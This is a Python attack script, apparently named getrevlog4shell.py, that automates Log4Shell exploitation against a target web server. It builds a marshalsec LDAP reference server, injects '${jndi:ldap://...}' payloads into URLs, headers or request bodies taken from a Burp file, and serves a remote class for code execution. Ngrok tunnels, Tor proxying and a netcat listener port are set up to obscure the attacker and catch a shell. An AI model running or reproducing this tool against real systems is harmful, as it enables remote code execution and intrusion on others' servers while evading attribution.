import subprocess
import os
import shlex
import json
import time
import urllib.request
import concurrent.futures
import socket
import argparse
from sys import prefix
from async_timeout import timeout
from git import Repo

class start_LDAP_Server():

    def __init__(self, cmd, path):
        self.cmd = cmd
        self.path = path
        self.stop_control = False
        self.forward_progress = False
        self.msg = ""
        self.pid = None

    def __del__(self):
        if hasattr(self, "proc"):
            self.proc.send_signal(subprocess.signal.SIGKILL)

    def clear(self):
        try:
            self.proc = subprocess.run("mvn clean package -DskipTests", shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(e)
        return

    def getpid(self):
        return self.proc.pid

    def run(self):
        os.chdir(self.path)
        if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
            self.cmd = 'cd ' + self.path + '; ' + self.cmd
            try:
                self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
                while True:
                    output = self.proc.stdout.readline()
                    if output == '' and self.proc.poll() is not None:
                        break
                    elif output.strip().decode() == 'Listening on 0.0.0.0:1389':
                        print(output.strip().decode())
                        print("Waiting for commands...")
                        self.forward_progress = True
                    elif 'Send LDAP reference result for' in output.strip().decode():
                        self.msg = output.strip().decode()
                        self.stop_control = True
                        self.proc.terminate()
                        self.proc.kill()
                        self.proc.send_signal(subprocess.signal.SIGKILL)
                self.proc.poll()
            except:
                pass
        else:
            print ('Cleaning package...')
            self.clear()
            self.run()
        return

def clear_process():
    p = subprocess.run("kill -9 $(ps aux | grep 'marshalsec.jndi.LDAPRefServer' | grep 'SNAPSHOT' | awk 'NR==1{ print $2 }')", shell=True, capture_output=True, text=True)
    if (p.returncode == 0):
        return clear_process()
    else:
        return

def execute(list_cmd, process):
    os.chdir(abs_path)
    list_code= []
    for cmd, code in list_cmd:
        time.sleep(2)
        if not process.stop_control:
            list_code.append(code)
            subprocess.run(shlex.split(cmd))
        else:
            msg = process.msg
            break
    
    result_code = msg.split("Send LDAP reference result for ")[1].split(' ')[0]
    if result_code in list_code:
        print("\n\nFound command:\n\n" + list_cmd[list_code.index(result_code)][0])
        end()
    else:
        print('Command not found in list')

def ngrok_start():
    global use_tor
    os.chdir(os.getcwd() + '/ngrok_tunnel')
    if use_tor:
        cmd = 'xterm -e ngrok start --all --config tunnel_tor.yml'
    else:
        cmd = 'xterm -e ngrok start --all --config tunnel.yml'
    return subprocess.run(shlex.split(cmd))

def ngrok_get():
    try:
        time.sleep(2)
        contents = urllib.request.urlopen("http://localhost:4040/api/tunnels").read()
        result = json.loads(contents.decode())
        if len(result['tunnels']) == 0:
            return ngrok_get()
    except:
        return ngrok_get()
        
    return result

def ngrok_verify_file():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel.yml')

def ngrok_verify_file_tor():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel_tor.yml')

def ngrok_verify():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    if not (os.path.isdir(path + path_ngrok)):
        os.makedirs(path + "/" + path_ngrok)

def ngrok_create(auth_token, port_http_server, port_ldap_server):
    string_ngrok = "authtoken: " + auth_token + ";tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    tor_string = 'socks5_proxy: "socks5://127.0.0.1:' + port_tor_tunnel + '";'
    string_ngrok_tor = "authtoken: " + auth_token + ";" + tor_string + "tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    print("Removing tunnel.yml and tunnel_tor if exists")
    try:
        os.system('rm ngrok_tunnel/tunnel.yml')
        os.system('rm ngrok_tunnel/tunnel_tor.yml')
        print("Removed ngrok_tunnel/tunnel.yml and ngrok_tunnel/tunnel_tor.yml")
    except subprocess.CalledProcessError:
        print("File ngrok_tunnel/tunnel.yml or ngrok_tunnel/tunnel_tor.yml not exist")

    f = open(os.getcwd() + '/ngrok_tunnel/tunnel.yml', "w")
    for i in string_ngrok.split(';'):
        f.write(i + '\n')
    f.close()

    f = open(os.getcwd() + '/ngrok_tunnel/tunnel_tor.yml', "w")
    for i in string_ngrok_tor.split(';'):
        f.write(i + '\n')
    f.close()

def git_clone():
    git_url= 'https://github.com/mbechler/marshalsec.git'
    path = os.getcwd()
    if not (os.path.isdir(path + path_ldap_service)):
        os.makedirs(path + "/" + path_ldap_service.split('/')[1])
        Repo.clone_from(git_url, path + path_ldap_service)

def end():
    return os.system("kill -9 " + str(os.getpid()))

def verify_server(process):
    global host_http, port_ldap_server
    while not process.forward_progress:
        time.sleep(3)
    try:
        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientsocket.connect((host_http, int(port_ldap_server)))
        clientsocket.sendall(b"Hello")
        clientsocket.close()
        return True
    except Exception as e:
        if e.strerror:
            return False

def to_process(commands):
    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        time.sleep(1)
        p0 = executor.submit(clear_process,)
        if use_ngrok:
            p1 = executor.submit(ngrok_start)
            p2 = executor.submit(ngrok_get,)
            result = p2.result()
            add_tcp = False
            for a in result['tunnels']:
                if a['proto'] == 'http':
                    host_http = a['public_url'].split('//')[1]
                    port_http_server = ''
                elif a['proto'] == 'tcp':
                    if not add_tcp:
                        add_tcp = True
                        host_tcp = a['public_url'].split('//')[1].split(':')[0]
                        port_ldap_server = a['public_url'].split(':')[2]
                    else:
                        host_nc = a['public_url'].split('//')[1].split(':')[0]
                        port_nc_server = a['public_url'].split(':')[2]
        else:
            pass
        port = ":" + port_http_server
        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port + '/#' + name_file +'"'
        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_service)
        if (os.path.isfile(abs_path + path_ldap_service + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
            timeout = 1
        else:
            timeout = 20
        try:
            p3 = executor.submit(ldap_server.run,)
            p3.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            pass
        
        progress = False
        try:
            p4 = executor.submit(verify_server, ldap_server)
            progress = p4.result(timeout=10)
        except concurrent.futures.TimeoutError:
            pass

        if progress:
            pass
        else:
            print("LDAP server loading error. Restart aplication.")
            end()

        p5 = executor.submit(execute, commands, ldap_server)

def readfile(burp_file):
    global vuln_server, method, headers, data
    headers_end = False
    headers = []
    data = []
    f = open(burp_file, "r")
    lines = f.readlines()
    
    for line in lines:
        if lines.index(line) == 0:
            line = line.strip("\n")
            method = line.split(" ")[0]
            sufix_host = line.split(" ")[1]
            protocol = (line.split(" ")[2].split("/")[0]).lower()
        elif "Host" in line:
            prefix_host = line.strip("\n").split(": ")[1]
        elif line == '\n':
            headers_end = True
        elif line != '' and line != '\n' and not headers_end:
            headers.append(line.strip("\n"))
        elif line != '' and line != '\n' and headers_end:
            data.append(line.strip("\n"))
    
    vuln_server = protocol + '://' + prefix_host + sufix_host
    f.close()
    commands = prepare_list_commands()
    return commands

def check(list):
    for l in list:
        if "*" in l:
            return True
    return False

def prepare_list_commands():
    global use_tor, port_tor_tunnel, method, vuln_server, headers, data
    
    string_tor = ' '
    str_header = ' '
    str_d = data[0]
    for i in headers:
        str_h = '-H "' + i + '" '
        str_header = str_header + str_h
    if use_tor:
        string_tor = '--proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
    terminate = False
    count = 0
    commands = []
    while not terminate:
        count += 1
        varcode = "{:05d}".format(count)
        str_injection = '${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
        if "*" in vuln_server:
            vuln_server = vuln_server.replace("*", str_injection)
            commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
        elif len(headers) > 0 and check(headers):
            for i in headers:
                if "*" in i:
                    i = i.replace("*", str_injection)
                    commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
                    i = i.replace(str_injection, "*")
                    break
        elif len(data) > 0 and "*" in data[0]:
            count = data[0].count("*")
            for i in range(count):
                str_data = '-d \'' + str_d.replace("*", str_injection, i + 1) + '\''
                if count <= (i + 1):
                    str_data = str_data.replace(str_injection, "*", count - i)
                commands.append(('curl' + string_tor + '-X ' + method + str_header + str_data + ' ' + vuln_server, varcode))
            break
        else:
            terminate = True
    
    return commands

def initialize():
    #global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, name_file, use_tor
    commands = []
    if burp_file:
        commands = readfile(burp_file)
    git_clone()
    if use_ngrok:
        ngrok_verify()
        if recreate:
            if not auth_token:
                print("You must to use auth token for ngrok")
                exit(0)
            else:
                ngrok_create(auth_token, port_http_server, port_ldap_server )
        else:
            if not auth_token:
                print("You must to use auth token for ngrok")
                exit(0)
            elif not ngrok_verify_file() or not ngrok_verify_file_tor():
                ngrok_create(auth_token, port_http_server, port_ldap_server )

    to_process(commands)

if __name__ == "__main__":
    name_file = 'log4jRCE'
    hostname = socket.gethostname()
    host_http = socket.gethostbyname(hostname)
    host_tcp = host_http
    host_nc = host_tcp
    path_ldap_service = "/LDAP_Service/marshalsec"
    abs_path = os.getcwd()
    parser = argparse.ArgumentParser(
        description='Usage getrevlog4shell.py -v "http://vulnerable.host" [options]',
        epilog='You must use ngrok and tor options to maintain privacy.'
        )
    parser.add_argument("-v", "--vns", type=str, help="Host vulnerable")
    parser.add_argument("-a", "--auth", type=str, help="Ngrok authtoken")
    parser.add_argument("-ngku", "--use_ngrok", help="Use ngrok", action="store_true")
    parser.add_argument("-rctn", "--rec_ng_file", help="Recreate ngrok file tunnels", action="store_true")
    parser.add_argument("-pls", "--port_ldap_server", type=int, help="Port of ldap server")
    parser.add_argument("-phs", "--port_http_server", type=int, help="Port of http server")
    parser.add_argument("-pns", "--port_nc_listener", type=int, help="Port of netcat listener")
    parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="Port of tor tunnel listener")
    parser.add_argument("-t", "--tor_proxy", help="Use tor proxy", action="store_true")
    parser.add_argument("-r", "--file", help="Burpsuit file")
    parser.add_argument("-d", "--data", help="Data")
    parser.add_argument("-H", "--headers", help="Headers")
    parser.add_argument("-X", "--method", help="Method", default="POST", choices=["GET", "POST"])
    args = parser.parse_args()

    port_ldap_server = '1389'
    port_http_server = '8000'
    port_nc_server = '1234'
    port_tor_tunnel = '9050'
    use_ngrok = False
    recreate = False
    auth_token = None
    vuln_server = None
    use_tor = None
    method = "POST"
    data = []
    headers = []
    file = None

    if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server).replace(" ", "")
    if args.port_http_server: port_http_server = str(args.port_http_server).replace(" ", "")
    if args.port_nc_listener: port_nc_server = str(args.port_nc_listener).replace(" ", "")
    if args.port_tor_tunnel: port_tor_tunnel = str(args.port_tor_tunnel).replace(" ", "")
    if args.use_ngrok: use_ngrok = args.use_ngrok
    if args.rec_ng_file: recreate = args.rec_ng_file
    if args.auth: auth_token = args.auth.replace(" ", "")
    if args.vns: vuln_server = args.vns.replace(" ", "")
    if args.tor_proxy: use_tor = args.tor_proxy
    if args.file: burp_file = args.file.replace(" ", "")
    if args.data: data = [args.data]
    if args.headers: headers = args.headers
    if args.method: method = args.method

    if not vuln_server and not burp_file:
        parser.print_help()
        print('Use burpfile ou enter request.')
        exit(0)
    elif burp_file:
        pass
    else:
        if not '*' in vuln_server:
            if check(data):
                pass
            elif check(headers):
                pass
            else:
                parser.print_help()
                print('Set location testing with param <*>.')
                exit(0)
    
    initialize()
    
        

        
        

        

